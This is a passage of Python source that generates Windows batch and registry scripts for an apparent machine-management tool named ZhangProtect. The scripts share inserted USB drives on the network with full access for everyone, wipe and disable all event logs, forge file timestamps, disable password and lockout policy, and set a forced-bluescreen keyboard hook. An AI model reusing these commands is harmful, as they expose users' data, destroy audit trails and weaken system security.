            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl\\LiveKernelReports\\NDIS]"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl\\LiveKernelReports\\WATCHDOG]"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl\\StorageTelemetry]"
            + chr(10)
            + ""
            + chr(34)
            + "DeviceDumpEnabled"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "StorageTCCode_0"
            + chr(34)
            + "=dword:00000077"
            + chr(10)
            + ""
            + chr(34)
            + "StorageTCCode_1"
            + chr(34)
            + "=dword:0000007a"
            + chr(10)
            + ""
            + chr(34)
            + "StorageTCCode_2"
            + chr(34)
            + "=dword:0000007b"
            + chr(10)
            + ""
            + chr(34)
            + "StorageTCCode_3"
            + chr(34)
            + "=dword:69696969"
            + chr(10)
            + ""
            + chr(34)
            + "StorageTCCode_4"
            + chr(34)
            + "=dword:000001c8"
        )
        crash_on = (
            "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters]"
            + chr(10)
            + ""
            + chr(34)
            + "CrashOnCtrlScroll"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\i8042prt\\crashdump]"
            + chr(10)
            + ""
            + chr(34)
            + "Dump1Keys"
            + chr(34)
            + "=dword:00000022"
            + chr(10)
            + ""
            + chr(34)
            + "Dump2Key"
            + chr(34)
            + "=dword:0000003d"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\kbdhid\\Parameters]"
            + chr(10)
            + ""
            + chr(34)
            + "CrashOnCtrlScroll"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\kbdhid\\crashdump]"
            + chr(10)
            + ""
            + chr(34)
            + "Dump1Keys"
            + chr(34)
            + "=dword:00000022"
            + chr(10)
            + ""
            + chr(34)
            + "Dump2Key"
            + chr(34)
            + "=dword:0000003d"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\hyperkbd\\Parameters]"
            + chr(10)
            + ""
            + chr(34)
            + "CrashOnCtrlScroll"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\hyperkbd\\crashdump]"
            + chr(10)
            + ""
            + chr(34)
            + "Dump1Keys"
            + chr(34)
            + "=dword:00000022"
            + chr(10)
            + ""
            + chr(34)
            + "Dump2Key"
            + chr(34)
            + "=dword:0000003d"
        )
        crash_off = (
            "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters]"
            + chr(10)
            + ""
            + chr(34)
            + "CrashOnCtrlScroll"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\i8042prt\\crashdump]"
            + chr(10)
            + ""
            + chr(34)
            + "Dump1Keys"
            + chr(34)
            + "=-"
            + chr(10)
            + ""
            + chr(34)
            + "Dump2Key"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\kbdhid\\Parameters]"
            + chr(10)
            + ""
            + chr(34)
            + "CrashOnCtrlScroll"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\kbdhid\\crashdump]"
            + chr(10)
            + ""
            + chr(34)
            + "Dump1Keys"
            + chr(34)
            + "=-"
            + chr(10)
            + ""
            + chr(34)
            + "Dump2Key"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\hyperkbd\\Parameters]"
            + chr(10)
            + ""
            + chr(34)
            + "CrashOnCtrlScroll"
            + chr(34)
            + "=-"
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\hyperkbd\\crashdump]"
            + chr(10)
            + ""
            + chr(34)
            + "Dump1Keys"
            + chr(34)
            + "=-"
            + chr(10)
            + ""
            + chr(34)
            + "Dump2Key"
            + chr(34)
            + "=-"
        )
        fraps_reg = (
            "[HKEY_CURRENT_USER\\Software\\Fraps3]"
            + chr(10)
            + ""
            + chr(34)
            + "Sampling Rate"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "Overlay Corner"
            + chr(34)
            + "=dword:00000004"
            + chr(10)
            + ""
            + chr(34)
            + "Always On Top"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "Monitor DWM"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "Benchmark Stop"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "Benchmark Time"
            + chr(34)
            + "=dword:0000003c"
            + chr(10)
            + ""
            + chr(34)
            + "LCD Output"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "Detailed Stats"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "Capture Key"
            + chr(34)
            + "=dword:00000079"
            + chr(10)
            + ""
            + chr(34)
            + "Log Key"
            + chr(34)
            + "=dword:0000007a"
            + chr(10)
            + ""
            + chr(34)
            + "Overlay Key"
            + chr(34)
            + "=dword:0000007b"
            + chr(10)
            + ""
            + chr(34)
            + "Movie Key"
            + chr(34)
            + "=dword:002901c0"  # 大写锁定键003a0014,`点002900c0,点+shift002902c0,点+Ctrl002901c0
            + chr(10)
            + ""
            + chr(34)
            + "Movie External Input Key"
            + chr(34)
            + "=dword:00000020"
            + chr(10)
            + ""
            + chr(34)
            + "Manual Build"
            + chr(34)
            + "=dword:00001f00"
            + chr(10)
            + ""
            + chr(34)
            + "Movie Framerate"
            + chr(34)
            + "=dword:00000014"
            + chr(10)
            + ""
            + chr(34)
            + "Movie Half Size"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "Movie Framerate Lock"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "Movie Capture Stereo3D"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "Movie Split Every 4 Gigabytes"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "Framerate On Screenshot"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "No Cursor"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "Force Lossless RGB"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "System Tray Only"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "Start Minimised"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "Movie Framerate User"
            + chr(34)
            + "=dword:00001068"
            + chr(10)
            + ""
            + chr(34)
            + "Screenshot Repeat"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "Screenshot Repeat Time"
            + chr(34)
            + "=dword:0000000a"
            + chr(10)
            + ""
            + chr(34)
            + "Screenshot Format"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "Record Sound"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "Record Sound External"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "Record Sound External Push"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "Sound Input"
            + chr(34)
            + "=dword:00000001"
            + chr(10)
            + ""
            + chr(34)
            + "Vista Multichannel"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "Run With Windows"
            + chr(34)
            + "=dword:00000000"
            + chr(10)
            + ""
            + chr(34)
            + "Screenshot Directory"
            + chr(34)
            + "="
            + chr(34)
            + ProtectDir.replace("\\", "\\" + "\\")
            + "Fraps\\"
            + "\\Screenshots"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Movie Directory"
            + chr(34)
            + "="
            + chr(34)
            + ProtectDir.replace("\\", "\\" + "\\")
            + "Fraps\\"
            + "\\Movies"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Benchmark Directory"
            + chr(34)
            + "="
            + chr(34)
            + ProtectDir.replace("\\", "\\" + "\\")
            + "Fraps\\"
            + "\\Benchmarks"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Directory"
            + chr(34)
            + "="
            + chr(34)
            + "c:\\"
            + "\\windows\\"
            + "\\fraps"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "WindowPosX"
            + chr(34)
            + "=dword:0000003c"
            + chr(10)
            + ""
            + chr(34)
            + "WindowPosY"
            + chr(34)
            + "=dword:000000a6"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32]"
            + chr(10)
            + ""
            + chr(34)
            + "VIDC.FPS1"
            + chr(34)
            + "="
            + chr(34)
            + "frapsvid.dll"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Fraps]"
            + chr(10)
            + ""
            + chr(34)
            + "DisplayName"
            + chr(34)
            + "="
            + chr(34)
            + "Fraps"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "UninstallString"
            + chr(34)
            + "="
            + chr(34)
            + "\\"
            + chr(34)
            + ProtectDir.replace("\\", "\\" + "\\")
            + "Fraps\\"
            + "\\fraps.exe\\"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "NsisSM"
            + chr(34)
            + "="
            + chr(34)
            + "Fraps"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "NsisInst"
            + chr(34)
            + "=hex:d9,10,ca,32,3e,1b,08,44,ca,79,61,a3,f0,7a,39,18,ba,6f,27,e0"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Fraps]"
            + chr(10)
            + ""
            + chr(34)
            + "Install_Dir"
            + chr(34)
            + "="
            + chr(34)
            + ProtectDir.replace("\\", "\\" + "\\")
            + "Fraps"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32]"
            + chr(10)
            + ""
            + chr(34)
            + "VIDC.FPS1"
            + chr(34)
            + "="
            + chr(34)
            + "frapsvid.dll"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\drivers.desc]"
            + chr(10)
            + ""
            + chr(34)
            + "C:\\"
            + "\\Windows\\"
            + "\\SysWOW64\\"
            + "\\l3codeca.acm"
            + chr(34)
            + "="
            + chr(34)
            + "Fraunhofer IIS MPEG Layer-3 Codec"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "frapsvid.dll"
            + chr(34)
            + "="
            + chr(34)
            + "Fraps Video Decompressor"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MediaResources\\icm\\VIDC.FPS1]"
            + chr(10)
            + ""
            + chr(34)
            + "Description"
            + chr(34)
            + "="
            + chr(34)
            + "Fraps Video Decompressor"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Driver"
            + chr(34)
            + "="
            + chr(34)
            + "frapsvid.dll"
            + chr(34)
        )
        if os.path.isfile(donotforcebluescreen):
            regfix = (
                regfixs + chr(10) + intefix + chr(10) + fraps_reg + chr(10) + crash_off
            )
        else:
            regfix = (
                regfixs + chr(10) + intefix + chr(10) + fraps_reg + chr(10) + crash_on
            )
        USBWrite1 = (
            "@echo off"
            + chr(10)
            + "set HereIs=0"
            + chr(10)
            + "set hidesettingflag="
            + chr(34)
            + str(hidesettingflag)
            + chr(34)
            + chr(10)
            + "set Udir="
            + chr(10)
            + ":start"
            + chr(10)
            + "timeout /NOBREAK /t 3"
            + chr(10)
            + "cls"
            + chr(10)
            + "    for /f "
            + chr(34)
            + "tokens=2 delims=="
            + chr(34)
            + " %%a in ("
            + chr(39)
            + "wmic LogicalDisk where "
            + chr(34)
            + "DriveType="
            + chr(39)
            + "2"
            + chr(39)
            + ""
            + chr(34)
            + " get DeviceID /value"
            + chr(39)
            + ") do ("
            + chr(10)
            + "      set DriveU=%%a"
            + chr(10)
            + " )"
            + chr(10)
            + "set Udir=%DriveU%"
            + chr(10)
            + "if exist %Udir% (echo.) else (Set HereIs=0 & Set Udir=)"
            + chr(10)
            + "if %HereIs%==0 (if exist %Udir% (goto Work) else goto start) else goto start"
            + chr(10)
            + "goto start"
            + chr(10)
            + ":Work"
            + chr(10)
            + "Set HereIs=1"
            + chr(10)
            + "icacls %Udir%\\* /t /c /q /inheritance:e"
        )
        USBWrite2 = (
            "takeown /f %Udir%\\* /a /r /d y"
            + chr(10)
            + "icacls %Udir%\\* /t /c /grant:r Everyone:(OI)(CI)(F)"
            + chr(10)
            + 'for /f "delims=" %%i in (\'dir /B /A %Udir%\') do ( if /I "%%i" equ "autorun.inf" (attrib +h +s +r +a /S /D /L "%Udir%\\%%i") else (if /I "%%i" equ "System Volume Information" (attrib +h +s +r +a /S /D /L "%Udir%\\%%i") else (attrib -h -s -r -a /S /D /L "%Udir%\\%%i")))'
            + chr(10)
            + (
                (
                    "del /f /q /a %Udir%\\autorun.inf"
                    + chr(10)
                    + "rd /s /q %Udir%\\autorun.inf"
                    + chr(10)
                    + "mkdir %Udir%\\autorun.inf\\protect..\\"
                )
                if os.path.isfile(doautoruninf)
                else "rem 不操作AutoRun.inf"
            )
            + chr(10)
            + "attrib %Udir%\\autorun.inf +s +h +r"
            + chr(10)
            + "if /I %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (net share USBDiskShare=%Udir% /unlimited /grant:everyone,full) else (net share USBDiskShare /delete)"
            + chr(10)
            + chr(10)
            + "icacls %Udir%\\ /setintegritylevel M"
            + chr(10)
            + "goto start"
        )
        USBWrite = USBWrite1 + chr(10) + USBWrite2
        Uninstaller = (
            "@echo off"
            + chr(10)
            + "for %%i in (1 2 3) do (echo 这是卸载程序!防止误触需要您三次确认!%%i & pause)"
            + chr(10)
            + "set datadir="
            + datadir
            + chr(10)
            + 'for /f "delims=" %%i in (\'dir '
            + ProtectDir
            + '*.exe /A /B /S\') do (taskkill /f /im %%~ni.exe /t 2>nul>nul & powershell "Get-Process -Name %%~ni | Stop-Process -Force")'
            + chr(10)
            + "schtasks /end /tn ZhangProtect\\Protect"
            + chr(10)
            + "for /f "
            + chr(34)
            + "tokens=1 delims=,"
            + chr(34)
            + " %%i in ('schtasks /query /fo csv /tn ZhangProtect\\ /NH') do ("
            + chr(10)
            + "schtasks /delete /F /tn ZhangProtect\\%%i 2>nul>nul"
            + chr(10)
            + ")"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\DriveIcons /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\Protect /f"
            + chr(10)
            + "shutdown -r -t 30"
            + chr(10)
            + 'del /f /q /a "'
            + ProtectDir
            + '*.*"'
            + chr(10)
            + 'rd /s /q "'
            + ProtectDir
            + '"'
            + chr(10)
            + 'taskkill /f /im wscript.exe /t & powershell "Get-Process -Name wscript | Stop-Process -Force"'
            + chr(10)
            + 'taskkill /f /im powershell.exe /t & powershell "Get-Process -Name powershell | Stop-Process -Force"'
            + chr(10)
            + 'start /b powershell taskkill /f /im cmd.exe /t & powershell "Get-Process -Name cmd | Stop-Process -Force"'
            + chr(10)
            + "exit"
        )
        Maintain_mode_bat = (
            "@echo off"
            + chr(10)
            + "cd /d %~dp0"
            + chr(10)
            + ":1"
            + chr(10)
            + "title 维护模式(字体变绿表示成功执行维护,未变绿不要执行其他操作)"
            + chr(10)
            + "echo 维护模式,ZhangProtect及内置组件已停止工作,请保持本程序运行"
            + chr(10)
            + "echo 对于装有硬盘还原的设备,字体变绿即恢复最佳状态,可直接进行冻结操作"
            + chr(10)
            + "echo 可创建文件 %cd%\\MainTainReboot 使得完成操作后自动重启"
            + chr(10)
            + "echo 可创建文件 %cd%\\CleanUninstaller 使维护程序自动清理卸载程序"
            + chr(10)
            + 'powershell "(ipconfig|select-string \\"IPv4\\"|out-string).Split(\\":\\")"'
            + chr(10)
            + "echo -------------------------------------------------------------------------------------"
            + chr(10)
            + "shutdown -a 2>nul>nul"
            + chr(10)
            + "echo 正在结束进程"
            + chr(10)
            + "for /f \"tokens=1 delims=,\" %%i in ('schtasks /query /fo csv /tn ZhangProtect\\ /NH') do ("
            + chr(10)
            + "schtasks /end /tn %%i >nul 2>nul"
            + chr(10)
            + ")"
            + chr(10)
            + 'powershell -NoProfile -ExecutionPolicy Bypass -Command "'
            + "$names=Get-ChildItem -LiteralPath '"
            + ProtectDir.replace("'", "''")
            + "' "
            + "-Filter *.exe -Recurse | "
            + "Select-Object -ExpandProperty BaseName -Unique; "
            + (
                "try{Stop-Process -Name $names -Force -ErrorAction SilentlyContinue}catch{}"
                if os.path.isfile(disable_Winmgmt)
                else "try{Stop-Process -Name $names -Force -ErrorAction SilentlyContinue}catch{};"
                "foreach($n in $names){taskkill /f /im ($n+'.exe') /t >$null 2>$null}"
            )
            + '"'
            + chr(10)
            + "schtasks /end /tn ZhangProtect\\Protect >nul 2>nul"
            + chr(10)
            + "taskkill /f /im wscript.exe /t >nul 2>nul"
            + (
                ""
                if os.path.isfile(disable_Winmgmt)
                else ' & powershell "Get-Process -Name wscript | Stop-Process -Force" >nul 2>nul'
            )
            + chr(10)
            + "echo 设置电源计划"
            + chr(10)
            + "powercfg /SETACTIVE SCHEME_BALANCED >nul 2>nul"
            + chr(10)
            + "powershell "
            + chr(45)
            + "NoProfile "
            + chr(45)
            + "ExecutionPolicy Bypass "
            + chr(45)
            + "Command "
            + chr(34)
            + "(powercfg /list) | ForEach-Object { if ($_ -match "
            + chr(39)
            + "[0-9a-fA-F-]{36}"
            + chr(39)
            + ") { $g=$matches[0]; powercfg /setacvalueindex $g SUB_VIDEO VIDEONORMALLEVEL 50; powercfg /setdcvalueindex $g SUB_VIDEO VIDEONORMALLEVEL 50 ; "
            + " ; ".join(
                [c.replace("[guid]", "$g") for c in zhang_change_all_powercfg(True)]
            )
            + " } }; powercfg /setactive SCHEME_CURRENT; (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(0,50)"
            + chr(34)
            + chr(10)
            + "echo 电源计划设置完毕"
            + chr(10)
            + nircmd_exe
            + (
                " setsysvolume 6500"
                if not os.path.isfile(lock_volume)
                else " setsysvolume 65535"
            )
            + chr(10)
            + nircmd_exe
            + (
                " mutesysvolume 1"
                if not os.path.isfile(lock_volume)
                else " mutesysvolume 0"
            )
            + chr(10)
            + "echo 音量设置完毕"
            + chr(10)
            + "echo 清理日志文件"
            + chr(10)
            + "del /f /q /a "
            + ProtectDir
            + "*.log 2>nul>nul"
            + chr(10)
            + "del /f /q /a "
            + chr(34)
            + ProtectDir
            + "network_ip_change_log.txt"
            + chr(34)
            + " 2>nul>nul"
            + chr(10)
            + "del /f /q /a "
            + chr(34)
            + ProtectDir
            + "TaskListLog.txt"
            + chr(34)
            + " 2>nul>nul"
            + chr(10)
            + "del /f /q /a "
            + chr(34)
            + ProtectDir
            + "network_int.txt"
            + chr(34)
            + " 2>nul>nul"
            + chr(10)
            + "del /f /q /a "
            + chr(34)
            + ProtectDir
            + "scan_result.txt"
            + chr(34)
            + " 2>nul>nul"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\DriveIcons /f 2>nul>nul"
            + chr(10)
            + (
                ("if exist " + ipcheck + " (" + iphelper + " -r)")
                if not os.path.isfile(disable_Winmgmt)
                else ""
            )
            + chr(10)
            + "ipconfig /flushdns"
            + chr(10)
            + 'reg delete "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles" /f'
            + chr(10)
            + 'reg delete "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Unmanaged" /f'
            + chr(10)
            + RestoreConf_exe
            + chr(10)
            + (
                "powershell \"Get-Childitem -path '%s' -Recurse | foreach-object { $_.LastWriteTime ='01/01/3000 00:00:00' ; $_.CreationTime = '01/01/3000 00:00:00'; $_.LastWriteTime = '01/01/3000 00:00:00'  } 2>$null\""
                % ProtectDir
            )
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config /t REG_DWORD /v MaxPosPhaseCorrection /d 0xFFFFFFFF /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config /t REG_DWORD /v MaxNegPhaseCorrection /d 0xFFFFFFFF /f"
            + chr(10)
            + "timeout /NOBREAK /t 1 >> nul"
            + chr(10)
            + "echo 移除对操作系统MAC的修改"
            + chr(10)
            + "for /f \"delims=\" %%i in ('reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}') do (reg delete %%i /v NetworkAddress /f 2>nul>nul)"
            + chr(10)
            + "netsh wlan disconnect"
            + chr(10)
            + f'if exist %cd%\\CleanUninstaller (echo 正在清理卸载程序 & start "" {Everything_Exe} & cmd /c "{CleanUninstaller_bat}")'
            + chr(10)
            + "echo 调用CCleaner清理"
            + chr(10)
            + f'start "" /wait "{CCleanerExe}" /AUTO'
            + chr(10)
            + "echo 正在清理系统日志"
            + chr(10)
            + "powershell -NoProfile -ExecutionPolicy Bypass -Command "
            + chr(34)
            + "$logs = Get-WinEvent -ListLog *; "
            + "foreach($l in $logs){ "
            + "try { wevtutil cl $l.LogName } catch {}; "
            + "try { wevtutil sl $l.LogName /e:false } catch {} "
            + "}; "
            + "wevtutil cl System 2>$null; "
            + "wevtutil sl System /e:false 2>$null"
            + chr(34)
            + chr(10)
            + "wevtutil.exe cl System 2>nul 1>nul"
            + chr(10)
            + "wevtutil.exe sl System /e:false 2>nul 1>nul"
            + chr(10)
            + "echo 系统日志已清理"
            + chr(10)
            + 'powershell "(ipconfig|select-string \\"IPv4\\"|out-string).Split(\\":\\")"'
            + chr(10)
            + "color a"
            + chr(10)
            + "title 完成"
            + chr(10)
            + "if exist %cd%\\MainTainReboot (echo 维护模式执行完毕,将自动重启 & shutdown -r -t 15 & pause & exit) else (echo 维护模式执行完毕,允许进行其他操作,60秒后重复执行)"
            + chr(10)
            + "timeout /NOBREAK /t 60 >> nul"
            + chr(10)
            + "cls"
            + chr(10)
            + "color a"
            + chr(10)
            + "goto 1"
        )
        BatComA1 = (
            "@echo off"
            + chr(10)
            + "setlocal enabledelayedexpansion"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Console /v QuickEdit /t REG_DWORD /d 00000000 /f"
            + chr(10)
            + 'for /f "tokens=3,*" %%i in (\'reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" /v Desktop\') do (set DesktopPath=%%i)'
            + chr(10)
            + 'for /f "delims=" %%i in (\'reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\') do (reg add "%%i" /t REG_DWORD /v DelayedAutostart /d 0 /f)'
            + chr(10)
            + "echo %DesktopPath%"
            + chr(10)
            + "set datadir="
            + datadir
            + chr(10)
            + "set hidesettingflag= "
            + chr(34)
            + str(hidesettingflag)
            + chr(34)
            + chr(10)
            + (
                "powercfg /hibernate off"
                if os.path.isfile(disablehibernate)
                else "powercfg /hibernate on"
            )
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Power /t reg_dword /v HibernateEnabled /d "
            + ("0" if os.path.isfile(disablehibernate) else "1")
            + " /f"
            + chr(10)
            + "bcdedit /set disabledynamictick yes"
            + chr(10)
            + "bcdedit /set useplatformclock no"
            + chr(10)
            + "net accounts /lockoutthreshold:0"
            + chr(10)
            + "net accounts /minpwlen:0"
            + chr(10)
            + "net accounts /maxpwage:unlimited"
            + chr(10)
            + "net accounts /minpwage:0"
            + chr(10)
            + 'sc stop "SysMain" & sc config "SysMain" start=disabled'
            + chr(10)
            + "echo [Unicode] > PasswordSecEdit.inf"
            + chr(10)
            + "echo Unicode=yes >> PasswordSecEdit.inf"
            + chr(10)
            + "echo [System Access] >> PasswordSecEdit.inf"
            + chr(10)
            + "echo MinimumPasswordAge = 0 >> PasswordSecEdit.inf"
            + chr(10)
            + "echo MaximumPasswordAge = -1 >> PasswordSecEdit.inf"
            + chr(10)
            + "echo MinimumPasswordLength = 0 >> PasswordSecEdit.inf"
            + chr(10)
            + "echo PasswordComplexity = 0 >> PasswordSecEdit.inf"
            + chr(10)
            + "echo PasswordHistorySize = 0 >> PasswordSecEdit.inf"
            + chr(10)
            + "echo [Version] >> PasswordSecEdit.inf"
            + chr(10)
            + "echo signature="
            + chr(34)
            + "$CHICAGO$"
            + chr(34)
            + " >> PasswordSecEdit.inf"
            + chr(10)
            + "echo Revision=1 >> PasswordSecEdit.inf"
            + chr(10)
            + "secedit /configure /db temp.sdb /cfg PasswordSecEdit.inf /quiet /overwrite"
            + chr(10)
            + "del /f /q temp.sdb"
            + chr(10)
            + "del /f /q temp.jfm"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v MinimumPasswordAge /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v MinimumPasswordLength /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v PasswordComplexity /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v PasswordHistorySize /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v MinimumPasswordAge /d 0 /f"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" /t REG_SZ /v BootExecute /d "" /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\PasswordLess\\Device" /t reg_dword /v DevicePasswordLessBuildVersion /d 0 /f'
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\OEMInformation /f"
            + chr(10)
            + (
                (
                    'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations" /t REG_DWORD /v DWMFRAMEINTERVAL /d 8 /f'
                    + chr(10)
                    + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /t REG_DWORD /v bEnumerateHWBeforeSW /d 1 /f'
                    + chr(10)
                    + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /t REG_DWORD /v SelectTransport /d 2 /f'
                    + chr(10)
                    + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /t REG_DWORD /v fEnableWddmDriver /d 1 /f'
                    + chr(10)
                    + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /t REG_DWORD /v MaxCompressionLevel /d 3 /f'
                    + chr(10)
                    + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /t REG_DWORD /v ImageQuality /d 4 /f'
                    + chr(10)
                    + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /t REG_DWORD /v AVC444ModePreferred /d 1 /f'
                    + chr(10)
                    + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /t REG_DWORD /v AVCHardwareEncodePreferred /d 1 /f'
                    + chr(10)
